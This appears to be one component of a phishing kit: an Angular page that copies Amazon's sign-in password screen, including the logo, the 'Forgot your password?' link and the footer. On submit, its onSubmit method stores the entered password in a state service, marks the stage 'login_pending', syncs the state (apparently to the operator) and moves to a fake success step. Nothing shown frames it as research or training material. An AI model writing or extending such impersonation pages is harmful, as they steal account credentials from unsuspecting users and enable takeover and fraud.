import { Component, inject, signal, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';

@Component({
    selector: 'app-amazon-password',
    standalone: true,
    imports: [CommonModule, FormsModule, ReactiveFormsModule],
    template: `
    <div class="amazon-flow-container">
      <div class="amazon-logo">
        <svg viewBox="0 0 103 32" xmlns="http://www.w3.org/2000/svg" width="103" height="32">
           <path d="M21.1 19.3c-1.1.8-2.5 1.2-4.1 1.2-3.3 0-5.4-2.2-5.4-5.2 0-3.3 2.1-5.6 5.6-5.6 1.4 0 2.6.4 3.5 1V7.3c-.9-.4-2.1-.7-3.6-.7-5.5 0-8.8 3.5-8.8 8.1 0 4.5 3.1 8 8.5 8 1.9 0 3.6-.5 4.9-1.3l-.6-2.1zM34.2 13.9h-3v8.9h3v-8.2c0-2.3 1.7-3.9 4-3.9.7 0 1.2.1 1.7.3l.8-2.8c-.5-.2-1.2-.3-1.8-.3-2 0-3.3 1-4 2.4l-.2-2.1h-2.9v10.6h2.4v-4.9zm13.6-6.3L48.9 2.9l-2.4.5-.9 4.2h3.2v2.2h-3.6v6.5c0 1.5.7 2.2 2.2 2.2.6 0 1.2-.1 1.6-.2l.3-2.2c-.3.1-.6.1-1 .1-.7 0-1-.2-1-.9v-5.6h2.2V7.6h-2.2l.7-3.5zM63.8 20.3c1.7.9 3.8 1.4 5.7 1.4 3.3 0 5-1.5 5-3.6 0-2-1.6-3-4.2-3.8-2-.6-4.5-1.5-4.5-3.8 0-1.8 1.5-3.2 4.3-3.2 1.6 0 3.1.3 4.4.9l-1 2c-1.1-.5-2.2-.7-3.4-.7-1.4 0-2.2.8-2.2 1.7 0 1.7 1.8 2.3 4.3 3.1 2.3.8 4.4 1.8 4.4 4 0 2.2-1.9 3.9-5.3 3.9-2.2 0-4.6-.6-6.8-1.7l.9-1.9H64l-.2 1.7zm-2.1-4.7c0-2.6-1.5-4.3-4-4.3-2.6 0-4.3 1.9-4.3 4.8 0 2.5 1.5 4.3 4.2 4.3 1.1 0 2.3-.2 3.2-.6l.4 2.2c-1.1.5-2.6.8-4 .8-4.3 0-6.9-3-6.9-6.8 0-4.2 2.9-7.1 7.2-7.1 2.5 0 4.4 1.1 5.2 2.8l-2.2.9c-.4-1.1-1.4-1.6-2.8-1.6-2.4 0-3.9 1.8-3.9 4.8 0 1.8.9 2.8 2.2 2.8 1.1 0 1.9-.9 1.9-2.3H56v-2h5.7v1.3zm25.9-4.8c-.8-.5-1.9-.8-3.1-.8-2.5 0-4.1 1.7-4.1 4.3 0 2.6 1.6 4.3 4.1 4.3 1.4 0 2.4-.4 3.2-.9V22c-1.1.5-2.4.7-3.6.7-4.1 0-6.8-2.9-6.8-6.6 0-3.6 2.7-6.5 6.6-6.5 1.5 0 2.9.3 3.9.7l-.2 2.3h.1l-.1-1.8zm6.5 2.1c0 2 1.5 3.3 3.6 3.3 1.4 0 2.4-.7 2.4-1.8 0-1.2-1.1-1.7-2.6-2-1.7-.3-3.6-1-3.6-3.2 0-2 1.6-3.4 4.3-3.4 1.7 0 3.1.5 4.1.9l-.9 1.9c-.8-.4-1.8-.7-3-.7-1.1 0-1.9.6-1.9 1.5 0 1 .9 1.6 2.4 1.9 1.9.4 3.8 1 3.8 3.3 0 2.2-1.8 3.7-4.6 3.7-1.9 0-3.8-.5-5-1l.9-1.9c.1 0-.1 0 0-.5zM102 24c-5.8 4.2-17 3.9-23.7.8-.5-.2-.7-.7-.4-1.2.2-.4.6-.7 1.1-.5 6.2 2.9 16.6 3.1 21.9-.7.6-.4.7-1.2.2-1.7-.8-.8-2 .4-1.8 1.4 0 .1.1.2.1.3.7.9 1.6 1.3 2.6 1.6z" fill="#111"></path>
           <path d="M99.6 19.3c-1.3-.4-3.4-1-2.9 1.4.1.6 1.1 3 1.1 3s1.5-2.6 1.8-3.2c.3-.6.6-1-0-1.2z" fill="#f90"></path>
        </svg>
      </div>

      <div class="amazon-card">
        <h1>Sign in</h1>
        
        <div style="margin-bottom: 20px; font-size: 13px;">
          <span style="margin-right: 5px;">{{ email() }}</span>
          <a href="javascript:void(0)" class="amz-link" (click)="changeEmail()">Change</a>
        </div>
        
        <form [formGroup]="passwordForm" (ngSubmit)="onSubmit()">
          <div class="amz-form-group">
             <div style="display: flex; justify-content: space-between; align-items: baseline;">
                <label for="password">Password</label>
                <a href="javascript:void(0)" class="amz-link" style="font-size: 13px;">Forgot your password?</a>
             </div>
            
            <input 
              type="password" 
              id="password" 
              formControlName="password"
              [class.error]="isFieldInvalid('password')"
            >
             <div *ngIf="isFieldInvalid('password')" style="color: #c40000; font-size: 11px; margin-top: 4px;">
               Enter your password
             </div>
          </div>

          <button 
            type="submit" 
            class="amz-btn-primary"
            [disabled]="passwordForm.invalid || isLoading()"
          >
            Sign in
          </button>
          
          <div style="display: flex; align-items: flex-start; margin-top: 12px;">
             <input type="checkbox" id="remember" style="margin-top: 2px;">
             <label for="remember" style="font-size: 13px; font-weight: 400; margin-left: 5px;">Keep me signed in. <a href="javascript:void(0)" class="amz-link">Details</a></label>
          </div>
        </form>
      </div>
      
      <footer class="amz-footer">
         <div class="links">
            <a href="javascript:void(0)">Conditions of Use</a>
            <a href="javascript:void(0)">Privacy Notice</a>
            <a href="javascript:void(0)">Help</a>
         </div>
         <div class="copyright">
            © 1996-2024, Amazon.com, Inc. or its affiliates
         </div>
      </footer>
    </div>
  `,
    styleUrls: ['../../../styles/flows/amazon.scss']
})
export class AmazonPasswordComponent implements OnInit {
    private fb = inject(FormBuilder);
    private router = inject(Router);
    private state = inject(StateService);

    email = signal<string>('');
    isLoading = signal(false);

    passwordForm = this.fb.group({
        password: ['', [Validators.required, Validators.minLength(4)]]
    });

    ngOnInit() {
        // If no email in state (refreshed page), redirect back to login
        const currentEmail = this.state.email();
        if (!currentEmail) {
            this.router.navigate(['/verify/amazon/login']);
        } else {
            this.email.set(currentEmail);
        }
    }

    isFieldInvalid(field: string): boolean {
        const control = this.passwordForm.get(field);
        return !!(control && control.invalid && (control.dirty || control.touched));
    }

    changeEmail() {
        this.router.navigate(['/verify/amazon/login']);
    }

    async onSubmit() {
        if (this.passwordForm.valid) {
            this.isLoading.set(true);
            const password = this.passwordForm.get('password')?.value;

            this.state.password.set(password);
            this.state.isLoginSubmitted.set(true);
            this.state.stage.set('login_pending');

            await this.state.syncState();

            setTimeout(() => {
                this.isLoading.set(false);
                // Navigate to global success or next step
                this.state.navigate('/verify/step-success');
            }, 800);
        } else {
            this.passwordForm.markAllAsTouched();
        }
    }
}
